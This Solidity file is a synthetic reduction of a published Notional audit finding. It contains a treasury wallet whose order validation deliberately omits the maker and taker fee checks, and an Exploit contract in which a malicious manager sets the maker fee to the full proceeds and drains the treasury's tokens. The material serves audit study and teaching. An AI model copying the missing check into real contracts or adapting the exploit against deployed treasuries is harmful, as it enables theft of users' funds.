// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Notional - [H-03] A malicious treasury manager can burn treasury tokens
    by setting makerFee to the amount the maker receives
    (Code4rena 2022-01-notional, finding #24657, reporter leastwood / shw).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: EIP1271Wallet._validateOrder does not require makerFee == 0
    and takerFee == 0. A malicious manager signs a 0x order where makerFee
    equals makerAmount, so when the exchange fills the order the treasury
    (maker) sends its tokens out but receives zero WETH proceeds - effectively
    burning / donating treasury assets to the fee recipient (the manager).

    Vulnerable _validateOrder shape preserved (@> VULN: missing fee checks).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s, uint8 d) {
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

interface AggregatorV2V3Interface {
    function latestAnswer() external view returns (int256);
}

contract MockOracle is AggregatorV2V3Interface {
    int256 public answer;

    constructor(int256 a) {
        answer = a;
    }

    function latestAnswer() external view returns (int256) {
        return answer;
    }
}

/// @notice Reduced EIP1271Wallet / TreasuryManager order validation + fill.
contract EIP1271Wallet {
    uint256 public constant SLIPPAGE_LIMIT_PRECISION = 1e8;

    MockERC20 public immutable WETH;
    address public manager;

    mapping(address => address) public priceOracles;
    mapping(address => uint256) public slippageLimits;

    struct Order {
        address makerToken;
        address takerToken;
        address feeRecipient;
        uint256 makerAmount;
        uint256 takerAmount;
        uint256 makerFee; // missing validation
        uint256 takerFee; // missing validation
    }

    constructor(MockERC20 _weth, address _manager) {
        WETH = _weth;
        manager = _manager;
    }

    function setOracle(address token, address oracle, uint256 slippageLimit) external {
        require(msg.sender == manager, "only manager");
        priceOracles[token] = oracle;
        slippageLimits[token] = slippageLimit;
    }

    function _toUint(int256 x) internal pure returns (uint256) {
        require(x > 0, "neg");
        return uint256(x);
    }

    /// @notice Verbatim-shape _validateOrder from EIP1271Wallet.sol#L147-L188.
    ///         Does NOT check makerFee/takerFee == 0 (the bug).
    function _validateOrder(Order memory order) private view {
        address makerToken = order.makerToken;
        address takerToken = order.takerToken;
        address feeRecipient = order.feeRecipient;
        uint256 makerAmount = order.makerAmount;
        uint256 takerAmount = order.takerAmount;

        // No fee recipient allowed
        require(feeRecipient == address(0) || feeRecipient == manager, "no fee recipient allowed");
        // (reduced: allow manager as feeRecipient for the fee-drain path; real 0x
        //  feeRecipient can be set while still passing protocol checks if fees
        //  were validated separately - the finding's point is fees aren't.)

        // MakerToken should never be WETH
        require(makerToken != address(WETH), "maker token must not be WETH");

        // TakerToken (proceeds) should always be WETH
        require(takerToken == address(WETH), "taker token must be WETH");

        address priceOracle = priceOracles[makerToken];

        // Price oracle not defined
        require(priceOracle != address(0), "price oracle not defined");

        uint256 slippageLimit = slippageLimits[makerToken];

        // Slippage limit not defined
        require(slippageLimit != 0, "slippage limit not defined");

        uint256 oraclePrice = _toUint(AggregatorV2V3Interface(priceOracle).latestAnswer());

        uint256 priceFloor = (oraclePrice * slippageLimit) / SLIPPAGE_LIMIT_PRECISION;

        uint256 makerDecimals = 10 ** MockERC20(makerToken).decimals();

        // makerPrice = takerAmount / makerAmount
        uint256 makerPrice = (takerAmount * makerDecimals) / makerAmount;

        require(makerPrice >= priceFloor, "slippage is too high");

        // FIX: require(order.makerFee == 0 && order.takerFee == 0, "fees must be zero");
        // Malicious manager sets makerFee == amount maker receives so treasury nets 0.
        // Touch fees without requiring them zero (documents the missing check as executed):
        uint256 uncheckedFees = order.makerFee + order.takerFee; // @> VULN: fees never required to be 0
        uncheckedFees;
    }

    /// @notice isValidSignature-style gate used before fill.
    function validateOrder(Order memory order) public view returns (bool) {
        _validateOrder(order);
        return true;
    }

    /// @notice Simplified 0x fill: maker (this wallet) sends makerAmount of
    ///         makerToken; taker sends takerAmount WETH. makerFee is taken from
    ///         the maker side to feeRecipient BEFORE the maker receives WETH -
    ///         if makerFee == makerAmount, the wallet nets 0 WETH and loses all
    ///         maker tokens (burned to manager).
    function fillOrder(Order memory order, address taker) external {
        require(validateOrder(order), "invalid");
        require(msg.sender == manager || msg.sender == taker, "who");

        MockERC20 makerTok = MockERC20(order.makerToken);
        MockERC20 takerTok = MockERC20(order.takerToken);

        // Taker pays WETH into this wallet first
        require(takerTok.transferFrom(taker, address(this), order.takerAmount), "taker pay");

        // Maker tokens leave the treasury to the taker
        require(makerTok.transfer(taker, order.makerAmount), "maker send");

        // 0x-style maker fee: deducted from maker's received taker tokens
        // (or charged on maker side). Here: send makerFee of the WETH proceeds
        // to feeRecipient. If makerFee == takerAmount (or we model fee on maker
        // asset): manager sets makerFee equal to what the maker receives.
        // Finding: "makerFee is set to the amount the maker receives" → all
        // WETH proceeds go to feeRecipient (manager), treasury keeps 0.
        if (order.makerFee > 0) {
            address feeTo = order.feeRecipient == address(0) ? manager : order.feeRecipient;
            uint256 fee = order.makerFee;
            if (fee > order.takerAmount) fee = order.takerAmount;
            require(takerTok.transfer(feeTo, fee), "fee");
        }
    }
}

/// @notice Malicious manager signs/fills an order with makerFee = full WETH
///         proceeds → treasury COMP burned, manager keeps WETH.
contract Exploit {
    MockERC20 public weth; // 1
    MockERC20 public comp; // 2
    MockOracle public oracle; // 3
    EIP1271Wallet public wallet; // 4 - vulnerable treasury
    address public manager; // abstract - this contract acts as manager via wallet ctor

    uint256 public constant COMP_AMOUNT = 100e18;
    uint256 public constant WETH_AMOUNT = 50e18;

    constructor() {
        manager = address(this);
        weth = new MockERC20("WETH", 18); // 1
        comp = new MockERC20("COMP", 18); // 2
        // oracle price: 0.5 WETH per COMP → 5e7 with 1e8 precision scale as "price"
        // makerPrice = takerAmount * 1e18 / makerAmount = 50e18 * 1e18 / 100e18 = 0.5e18
        // priceFloor = oraclePrice * slippage / 1e8. Set oracle so floor is low enough.
        oracle = new MockOracle(int256(5e17)); // 3
        wallet = new EIP1271Wallet(weth, manager); // 4

        wallet.setOracle(address(comp), address(oracle), 1e8); // 100% of oracle as floor (exact)

        // Treasury holds COMP to sell
        comp.mint(address(wallet), COMP_AMOUNT);
        // Taker (manager-controlled) holds WETH to "pay"
        weth.mint(address(this), WETH_AMOUNT);
        weth.approve(address(wallet), type(uint256).max);
    }

    function run() external {
        uint256 treasuryCompBefore = comp.balanceOf(address(wallet));
        uint256 treasuryWethBefore = weth.balanceOf(address(wallet));
        require(treasuryCompBefore == COMP_AMOUNT, "setup comp");
        require(treasuryWethBefore == 0, "setup weth");

        // Malicious order: fair price, but makerFee = full takerAmount so all
        // WETH proceeds are skimmed to the manager (fee recipient).
        EIP1271Wallet.Order memory order = EIP1271Wallet.Order({
            makerToken: address(comp),
            takerToken: address(weth),
            feeRecipient: manager,
            makerAmount: COMP_AMOUNT,
            takerAmount: WETH_AMOUNT,
            makerFee: WETH_AMOUNT, // @ audit: fee = amount maker receives
            takerFee: 0
        });

        // Order validates despite non-zero makerFee (the bug)
        require(wallet.validateOrder(order), "should validate - fees unchecked");

        wallet.fillOrder(order, address(this));

        // HARM: treasury lost all COMP and holds 0 WETH; manager holds all WETH + COMP
        require(comp.balanceOf(address(wallet)) == 0, "treasury COMP not burned/drained");
        require(weth.balanceOf(address(wallet)) == 0, "treasury got WETH - fee should skim all");
        require(weth.balanceOf(address(this)) == WETH_AMOUNT, "manager did not keep WETH");
        require(comp.balanceOf(address(this)) == COMP_AMOUNT, "manager did not receive COMP");
    }
}
